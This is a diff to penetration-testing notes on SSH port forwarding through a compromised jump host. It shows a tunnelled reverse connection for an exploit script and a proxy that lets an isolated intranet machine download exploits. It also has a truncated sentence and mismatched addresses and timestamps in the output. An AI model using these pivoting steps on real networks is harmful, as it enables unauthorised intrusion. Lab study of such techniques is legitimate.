@@ -146,8 +146,9 @@ This is similar to Scenario 2. We changed the 127.0.0.1 to the intranet web port
 
 ### Scenario 5:
 - I have gained access to intranet admin web portal (172.16.1.2:80) via my exploited jump host (10.10.1.10 or 172.16.1.10) via Scenario 3.
-- I found a vulnerability on 172.16.1.2:80 and I want to get a reverse connection back to my host machine (10.10.1.32). 
+- I found a vulnerability on 172.16.1.2:80 and 
 - There is an SSH client inside the jumphost.
+- I want to get a reverse connection back to my host machine (10.10.1.32) via tunneling through jump host at 172.16.1.10:4444. 
 
 Technique: Local Port Forwarding via SSH within jumphost to send reverse connection back to our host
 
@@ -161,7 +162,7 @@ tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      
 (jumphost)$ ssh -L 172.16.1.10:4444:10.10.1.32:9999 kali@10.10.1.32
 (jumphost)$ netstat -antp
 ...
-tcp        0      0 172.16.1.100:9877       0.0.0.0:*               LISTEN      2283967/ssh
+tcp        0      0 172.16.1.10:4444       0.0.0.0:*               LISTEN      2283967/ssh
 ...
 (host)# proxychains exploit.py --lhost=172.16.1.10 --lport=4444
 ```
@@ -178,3 +179,40 @@ I have failed to successfully set a binding address via `-R` connecting from my 
 I found out the reason why was due to an option not being enabled as documented in the Man page for SSH -R: 
 > By default, TCP listening sockets on the server will be bound to the loopback interface only.  This may be overridden by specifying a bind_address.  An empty bind_address, or the address ‘*’, indicates that the remote socket should listen on all interfaces.  Specifying a remote bind_address will only succeed if the server's GatewayPorts option is enabled (see sshd_config(5))
 
+### Scenario 6:
+- I am able to get a reverse connection back using technique in Scenario 5.
+- The intranet machine (172.16.1.2) does not have internet access. 
+- I want to turn my host machine into a HTTP proxy so that the intranet machine can download exploits online.
+
+Technique: Local Port Forwarding via SSH within jumphost to send reverse connection back to our host's burp suite.
+
+```sh
+(intranet)$ wget http://example.com
+--2023-01-19 10:28:33--  http://example.com/
+Resolving example.com (example.com)... failed: Temporary failure in name resolution.
+wget: unable to resolve host address 'example.com'
+
+(host)# service ssh start
+(host)# netstat -antp
+...
+tcp6       0      0 10.10.1.32:8080        :::*                    LISTEN      126371/java (Burp Suite)
+...
+(jumphost)$ ssh -L 172.16.1.10:8888:10.10.1.32:8080 kali@10.10.1.32
+(jumphost)$ netstat -antp
+...
+tcp        0      0 172.16.1.10:8888       0.0.0.0:*               LISTEN      2283967/ssh
+...
+(intranet)$ export http_proxy=http://172.16.1.10:8888
+(intranet)$ wget http://example.com
+--2023-01-19 10:18:20--  http://example.com/
+Connecting to 172.16.1.100:8888... connected.
+Proxy request sent, awaiting response... 200 OK
+Length: 1256 (1.2K) [text/html]
+Saving to: 'index.html'
+
+     0K .                                                     100% 55.3M=0s
+
+2023-01-19 10:18:21 (55.3 MB/s) - 'index.html' saved [1256/1256]
+```
+**Explanation:**
+I set my Burpsuite, a web proxy, to listen at 10.10.1.32:8080. We use the same technique from Scenario 5 forwarding any connection to 172.16.1.10:8888 to our Burpsuite. Within the intranet machine, I can set the HTTP Proxy as the jump host and it will retrieve files from the internet via the host. 
